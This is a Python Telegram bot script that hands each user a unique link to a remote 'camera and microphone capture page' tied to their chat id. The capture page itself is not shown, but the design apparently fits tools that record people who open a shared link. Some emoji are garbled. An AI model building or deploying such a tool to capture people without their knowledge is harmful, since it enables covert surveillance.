import os
from dotenv import load_dotenv
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from utils import encode_uid

# Load environment variables
load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
BASE_URL = os.getenv("BASE_URL")  # e.g. https://your-render-app.onrender.com

if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN is not set in the environment variables.")

if not BASE_URL:
    raise RuntimeError("BASE_URL is not set in the environment variables.")

bot = telebot.TeleBot(BOT_TOKEN)


@bot.message_handler(commands=['start'])
def send_welcome(message):
    """Send welcome message with Generate Link button."""
    markup = InlineKeyboardMarkup()
    btn = InlineKeyboardButton("ߓ Generate Link", callback_data="generate_link")
    markup.add(btn)

    bot.send_message(
        message.chat.id,
        f"ߑ Hello {message.from_user.first_name}!\n\n"
        "Click the button below to open the camera and microphone capture page.",
        reply_markup=markup
    )


@bot.callback_query_handler(func=lambda call: call.data == "generate_link")
def send_link(call):
    """Send a unique capture link to the user."""
    uid = encode_uid(call.message.chat.id)
    capture_url = f"{BASE_URL}/capture?uid={uid}"
    bot.send_message(call.message.chat.id, f"ߎ Here is your capture link:\n{capture_url}")


if __name__ == "__main__":
    print("✅ Bot is running...")
    bot.infinity_polling()
